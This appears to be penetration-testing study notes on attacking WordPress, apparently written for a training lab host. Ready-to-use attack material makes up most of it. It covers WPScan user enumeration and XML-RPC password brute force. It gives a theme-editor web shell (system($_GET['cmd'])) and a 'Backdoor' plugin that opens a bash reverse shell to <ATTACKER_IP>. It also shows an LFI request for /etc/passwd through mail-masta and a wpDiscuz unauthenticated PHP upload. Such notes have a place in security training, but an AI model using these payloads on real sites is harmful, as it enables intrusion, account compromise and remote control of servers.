# WordPress
## 1. Discovery and Fingerprinting
Identifying a WordPress installation is often straightforward due to its distinctive file structure and headers.
- **`robots.txt`**: Check for standard WordPress paths like `/wp-admin/` or `/wp-includes/`.
- **Source Code**: Look for `meta name="generator" content="WordPress x.x.x"` or references to `/wp-content/themes/` and `/wp-content/plugins/`.
- **Headers**: Use `curl -I` to check for specific headers or server responses.
```shell
# Check robots.txt
curl -s http://blog.inlanefreight.local/robots.txt

# Grep for generator tag
curl -s http://blog.inlanefreight.local | grep "generator"

# Enumerate Themes and Plugins via source
curl -s http://blog.inlanefreight.local | grep -oE 'wp-content/(themes|plugins)/[^/]+' | sort -u
```
## 2. Automated Enumeration (WPScan)
`WPScan` is the standard tool for WordPress assessments. It enumerates users, themes, plugins, and checks for known vulnerabilities using the WPVulnDB (now WPScan Vulnerability Database).
- **API Token:** For vulnerability data, register at [wpscan.com](https://wpscan.com/) and use the `--api-token` flag.
- **User Enumeration:** WordPress often exposes usernames via author archives (`/?author=1`) or the REST API (`/wp-json/wp/v2/users`). WPScan automates this.
```shell
# Full Enumeration (Users, Plugins, Themes)
wpscan --url http://blog.inlanefreight.local --enumerate u,p,t --api-token <YOUR_TOKEN>

# Password Bruteforce (XML-RPC)
# XML-RPC is faster than the login form.
wpscan --url http://blog.inlanefreight.local --passwords /usr/share/wordlists/rockyou.txt --usernames john --password-attack xmlrpc
```
## 3. Authenticated Remote Code Execution (RCE)
If you gain administrative access (via credential reuse, brute force, or SQLi), RCE is trivial by modifying the site's PHP code.
### Method A: Theme Editor
WordPress allows admins to edit theme files directly from the dashboard (**Appearance -> Theme Editor**).
1. **Select a Theme:** Choose the currently active theme (e.g., Twenty Nineteen).
2. **Select a File:** Choose a rarely used template like `404.php` or `footer.php`.
3. **Inject Code:** Add a web shell payload.
```php
system($_GET['cmd']);
```
4. **Execute:** Navigate to the file URL to run commands.
```shell
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?cmd=id
```
### Method B: Malicious Plugin Upload
You can upload a custom plugin containing a reverse shell.
1. **Create Plugin:** Create a PHP file with standard plugin headers and your payload.

```PHP
<?php
	/*
	Plugin Name: Backdoor
	*/
	exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'");
?>
```
2. **Zip and Upload:** Compress it into a `.zip` file. Go to **Plugins -> Add New -> Upload Plugin**.
3. **Activate:** Once installed, click **Activate** to trigger the shell.

- **Metasploit:** The `exploit/unix/webapp/wp_admin_shell_upload` module automates this process.
## 4. Leveraging Vulnerable Plugins
Plugins are the most common attack vector in WordPress. Vulnerabilities range from unauthenticated SQLi to arbitrary file upload.
### Example 1: Local File Inclusion (Mail Masta)
The `mail-masta` plugin (and many others) suffers from LFI vulnerabilities in its include parameters.
- **Vector:** The `pl` parameter in `/inc/campaign/count_of_send.php` takes a file path without sanitization.
- **Exploitation:**
```shell
curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```
### Example 2: Unauthenticated File Upload (wpDiscuz)
Certain versions of `wpDiscuz` (7.0.4) allow unauthenticated users to upload files disguised as images that are executed as PHP.
- **Mechanism:** The plugin checks MIME types but fails to validate the file extension or content properly on the server side.
- **Exploitation:** Use a script or manual request to upload a PHP shell with a "Magic Byte" (GIF89a) to trick the check.
```shell
# Exploit script usage
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1

# Execution
curl -s http://blog.inlanefreight.local/wp-content/uploads/.../shell.php?cmd=id
```